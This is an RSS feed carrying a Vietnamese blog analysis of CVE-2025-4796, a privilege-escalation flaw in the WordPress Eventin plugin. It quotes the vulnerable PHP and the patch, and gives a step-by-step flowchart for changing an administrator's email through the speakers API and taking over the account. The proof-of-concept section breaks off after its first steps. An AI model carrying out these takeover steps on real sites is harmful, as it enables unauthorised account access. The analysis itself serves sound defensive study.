<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/vi/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Mon, 12 Jan 2026 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-4796 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/</link>
      <pubDate>Mon, 12 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Eventin&lt;/strong&gt; cho WordPress &lt;strong&gt;dễ bị leo thang đặc quyền&lt;/strong&gt; thông qua &lt;strong&gt;chiếm quyền tài khoản&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;từ trước đến và bao gồm 4.0.34&lt;/strong&gt;. Nguyên nhân là do plugin &lt;strong&gt;không xác thực đúng danh tính hoặc quyền hạn của người dùng&lt;/strong&gt; trước khi cập nhật thông tin như &lt;strong&gt;email&lt;/strong&gt; trong hàm &lt;strong&gt;&lt;code&gt;Eventin\Speaker\Api\SpeakerController::update_item&lt;/code&gt;&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; nhưng có &lt;strong&gt;quyền contributor trở lên&lt;/strong&gt; có thể &lt;strong&gt;thay đổi địa chỉ email của bất kỳ người dùng nào&lt;/strong&gt;, bao gồm cả &lt;strong&gt;quản trị viên&lt;/strong&gt;, từ đó &lt;strong&gt;đặt lại mật khẩu&lt;/strong&gt; và &lt;strong&gt;chiếm quyền truy cập tài khoản&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-4796&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-4796&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 4.0.34&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-event-solution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Eventin Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Eventin&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.34&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.35&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một API như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    $this-&amp;gt;namespace, // &amp;#39;eventin/v2&amp;#39;&#xA;    &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;, // &amp;#39;speakers&amp;#39;&#xA;    array(&#xA;        &amp;#39;args&amp;#39; =&amp;gt; array(&#xA;            &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the post.&amp;#39;, &amp;#39;eventin&amp;#39; ),&#xA;                &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;            ),&#xA;        ),&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_collection_params(),&#xA;        ),&#xA;        ...&#xA;    ),&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình trên:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$this-&amp;gt;namespace&lt;/code&gt; = &lt;strong&gt;&lt;code&gt;eventin/v2&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$this-&amp;gt;rest_base&lt;/code&gt; = &lt;strong&gt;&lt;code&gt;speakers&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; = &lt;strong&gt;tham số ID dạng số&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;API endpoint đầy đủ sẽ có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/eventin/v2/speakers/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có request đến endpoint trên với method hợp lệ thì callback &lt;code&gt;update_item&lt;/code&gt; nhưng trước hết cần vượt qua hàm kiểm tra quyền &lt;code&gt;update_item_permissions_check&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    return current_user_can( &amp;#39;etn_manage_organizer&amp;#39; )&#xA;                || current_user_can( &amp;#39;etn_manage_event&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm sẽ cho phép request đi tiếp (&lt;code&gt;return true&lt;/code&gt;) nếu user hiện tại có một trong hai quyền: &lt;code&gt;etn_manage_organizer&lt;/code&gt; hoặc &lt;code&gt;etn_manage_event&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;etn_manage_organizer&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/search.png&#34; title=&#34;Search&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/search.png&#39; alt=&#34;Search&#34; height=&#34;870&#34; width=&#34;1340&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy role contributor cũng được gán 2 quyền này&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Endpoint này dành cho người dùng có role &lt;strong&gt;Contributor&lt;/strong&gt; trở lên.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;update_item&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $data = $this-&amp;gt;prepare_item_for_database( $request );&#xA;&#xA;    if ( is_wp_error( $data ) ) {&#xA;        return $data;&#xA;    }&#xA;&#xA;    $speaker = new User_Model( $request[&amp;#39;id&amp;#39;] );&#xA;    ...&#xA;    $updated = $speaker-&amp;gt;update( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm sẽ gọi đến &lt;strong&gt;&lt;code&gt;prepare_item_for_database()&lt;/code&gt;&lt;/strong&gt; để thực hiện các bước &lt;strong&gt;chuẩn bị dữ liệu cần thiết trước khi tiến hành thao tác tạo mới hoặc cập nhật&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function prepare_item_for_database( $request ) {&#xA;    $prepared_data = [];&#xA;    $input_data    = json_decode( $request-&amp;gt;get_body(), true );&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;id&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;id&amp;#39;] = intval( $input_data[&amp;#39;id&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;name&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_title&amp;#39;] = sanitize_text_field( $input_data[&amp;#39;name&amp;#39;] );&#xA;        $prepared_data[&amp;#39;display_name&amp;#39;]      = sanitize_text_field( $input_data[&amp;#39;name&amp;#39;] );&#xA;    }&#xA;    &#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;email&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_website_email&amp;#39;] = sanitize_text_field( $input_data[&amp;#39;email&amp;#39;] );&#xA;        $prepared_data[&amp;#39;user_login&amp;#39;]                = sanitize_email( $input_data[&amp;#39;email&amp;#39;] );&#xA;    }&#xA;&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;social&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_social&amp;#39;] = $input_data[&amp;#39;social&amp;#39;] ;&#xA;    }&#xA;&#xA;&#xA;    if ( ! empty( $input_data[&amp;#39;category&amp;#39;] ) &amp;amp;&amp;amp; is_array( $input_data[&amp;#39;category&amp;#39;] ) ) {&#xA;        $allowed_categories = [&amp;#39;speaker&amp;#39;, &amp;#39;organizer&amp;#39;];&#xA;        $filtered_categories = array_intersect( $input_data[&amp;#39;category&amp;#39;], $allowed_categories );&#xA;    &#xA;        if ( ! empty( $filtered_categories ) ) {&#xA;            $prepared_data[&amp;#39;etn_speaker_category&amp;#39;] = $filtered_categories;&#xA;        } else {&#xA;            unset( $prepared_data[&amp;#39;etn_speaker_category&amp;#39;] ); // Or you can leave it out entirely&#xA;        }&#xA;    }       &#xA;    &#xA;    if ( ! empty( $input_data[&amp;#39;speaker_group&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;etn_speaker_group&amp;#39;] =  $input_data[&amp;#39;speaker_group&amp;#39;] ? json_encode($input_data[&amp;#39;speaker_group&amp;#39;]) : json_encode([]);&#xA;    }        &#xA;    &#xA;        &#xA;    //non mandatory field&#xA;    $prepared_data[&amp;#39;date&amp;#39;]                      =  $input_data[&amp;#39;date&amp;#39;] ? $input_data[&amp;#39;date&amp;#39;] : date(&amp;#34;Y-m-d H:i:s&amp;#34;);&#xA;    $prepared_data[&amp;#39;etn_speaker_designation&amp;#39;]   = ! empty( $input_data[&amp;#39;designation&amp;#39;] ) ? sanitize_text_field( $input_data[&amp;#39;designation&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_company_name&amp;#39;]          = ! empty( $input_data[&amp;#39;company_name&amp;#39;] ) ? sanitize_text_field( $input_data[&amp;#39;company_name&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_speaker_url&amp;#39;]           = ! empty( $input_data[&amp;#39;company_url&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;company_url&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_speaker_summery&amp;#39;]       = ! empty( $input_data[&amp;#39;summary&amp;#39;] ) ? wp_kses_post( $input_data[&amp;#39;summary&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;image&amp;#39;]                     = ! empty( $input_data[&amp;#39;image&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;image&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;image_id&amp;#39;]                  = ! empty( $input_data[&amp;#39;image_id&amp;#39;] ) ? intval( $input_data[&amp;#39;image_id&amp;#39;] ) : attachment_url_to_postid( $input_data[&amp;#39;image&amp;#39;] );&#xA;    $prepared_data[&amp;#39;etn_speaker_company_logo&amp;#39;]  = ! empty( $input_data[&amp;#39;company_logo&amp;#39;] ) ? sanitize_url( $input_data[&amp;#39;company_logo&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $prepared_data[&amp;#39;etn_company_logo_id&amp;#39;]       = ! empty( $input_data[&amp;#39;company_logo_id&amp;#39;] ) ? intval( $input_data[&amp;#39;company_logo_id&amp;#39;] ): attachment_url_to_postid( $input_data[&amp;#39;company_logo&amp;#39;] );&#xA;&#xA;&#xA;    if ( isset( $input_data[&amp;#39;hide_user&amp;#39;] ) ) {&#xA;        $prepared_data[&amp;#39;hide_user&amp;#39;] = $input_data[&amp;#39;hide_user&amp;#39;];&#xA;    }&#xA;    &#xA;    return $prepared_data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;strong&gt;&lt;code&gt;prepare_item_for_database()&lt;/code&gt;&lt;/strong&gt; dùng để &lt;strong&gt;decode JSON từ body request, sanitize và chuẩn hóa dữ liệu, map các trường cần thiết sang cấu trúc nội bộ, sau đó trả về mảng dữ liệu để phục vụ việc tạo hoặc cập nhật speaker trong database&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau đó hàm &lt;code&gt;update_item&lt;/code&gt; khởi tạo speaker theo &lt;code&gt;$request[&#39;id&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gọi &lt;code&gt;$speaker-&amp;gt;update($data)&lt;/code&gt; để ghi dữ liệu đã chuẩn hóa vào database, cập nhật thông tin speaker.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update( $args = [] ) {&#xA;    $user = get_userdata($this-&amp;gt;id);&#xA;    ...&#xA;    $email = !empty($args[&amp;#39;etn_speaker_website_email&amp;#39;]) ? $args[&amp;#39;etn_speaker_website_email&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    $user_data = $user-&amp;gt;to_array();&#xA;    ...&#xA;    if ( $email ) {&#xA;        $user_data[&amp;#39;user_email&amp;#39;] = $email;&#xA;    }&#xA;&#xA;    ...&#xA;    $user_id = wp_update_user( $user_data );&#xA;&#xA;    ...&#xA;    return $user_id;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;strong&gt;&lt;code&gt;update()&lt;/code&gt;&lt;/strong&gt; lấy thông tin user theo &lt;strong&gt;ID được truyền từ request&lt;/strong&gt;, chuyển dữ liệu user sang mảng, sau đó &lt;strong&gt;ghi đè trường &lt;code&gt;user_email&lt;/code&gt; nếu có giá trị mới&lt;/strong&gt; và gọi &lt;strong&gt;&lt;code&gt;wp_update_user()&lt;/code&gt;&lt;/strong&gt; để cập nhật trực tiếp dữ liệu user trong hệ thống.&lt;/p&gt;&#xA;&lt;p&gt;Do &lt;strong&gt;ID và email đều có thể bị kiểm soát từ request&lt;/strong&gt;, toàn bộ luồng cập nhật có thể bị attacker lợi dụng để &lt;strong&gt;thay đổi email của bất kỳ user nào&lt;/strong&gt;. Khi email của nạn nhân (ví dụ admin) bị đổi sang email do attacker kiểm soát, attacker chỉ cần thực hiện chức năng &lt;strong&gt;reset mật khẩu&lt;/strong&gt; để &lt;strong&gt;chiếm quyền tài khoản (Account Takeover)&lt;/strong&gt;, từ đó dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;code&gt;v4.0.35&lt;/code&gt; bổ sung các kiểm soát sau trong hàm &lt;code&gt;update_item&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$target_user_id = (int) $request-&amp;gt;get_param(&amp;#39;id&amp;#39;);&#xA;$target_user    = get_userdata($target_user_id);&#xA;&#xA;// Validate user tồn tại&#xA;if ( ! $target_user ) {&#xA;    return new WP_Error(&amp;#39;user_not_found&amp;#39;, &amp;#39;User does not exist&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 404]);&#xA;}&#xA;&#xA;// Kiểm tra quyền chỉnh sửa user&#xA;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $target_user_id ) ) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&#xA;&#xA;// Chỉ cho phép chỉnh sửa speaker / organizer&#xA;if (&#xA;    ! in_array(&amp;#39;etn-speaker&amp;#39;, (array) $target_user-&amp;gt;roles, true) &amp;amp;&amp;amp;&#xA;    ! in_array(&amp;#39;etn-organizer&amp;#39;, (array) $target_user-&amp;gt;roles, true)&#xA;) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&#xA;&#xA;// Chặn cập nhật các role nhạy cảm&#xA;if (&#xA;    in_array(&amp;#39;administrator&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;editor&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;author&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;contributor&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;subscriber&amp;#39;, (array) $target_user-&amp;gt;roles, true) ||&#xA;    in_array(&amp;#39;etn-customer&amp;#39;, (array) $target_user-&amp;gt;roles, true)&#xA;) {&#xA;    return new WP_Error(&amp;#39;forbidden&amp;#39;, &amp;#39;forbidden&amp;#39;, [&amp;#39;status&amp;#39; =&amp;gt; 403]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các kiểm tra này đảm bảo &lt;strong&gt;chỉ user hợp lệ mới được phép cập nhật speaker/organizer&lt;/strong&gt;, ngăn chặn việc &lt;strong&gt;sửa email trái phép và chiếm quyền tài khoản&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Authenticated – Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Speaker edit page in Eventin admin UI&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;UI sends request to /wp-json/eventin/v2/speakers/{id}&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Attacker intercepts request using BurpSuite&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Modify {id} to target arbitrary user (e.g., Administrator)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Change email field to attacker-controlled email&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Send forged request to API endpoint&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;update_item_permissions_check() passes (Contributor has etn_manage_* capability)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;prepare_item_for_database() accepts and maps user-controlled id and email&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;User_Model instantiated with attacker-supplied id&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update() overwrites user_email and calls wp_update_user()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user&amp;#39;s email is changed to attacker-controlled email&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker triggers WordPress password reset for the victim account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Reset link is delivered to attacker email&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attacker sets new password&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Attacker logs in as victim (e.g., Administrator)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Privilege Escalation / Account Takeover achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Đăng nhập bằng tài khoản &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thực hiện cập nhật speaker 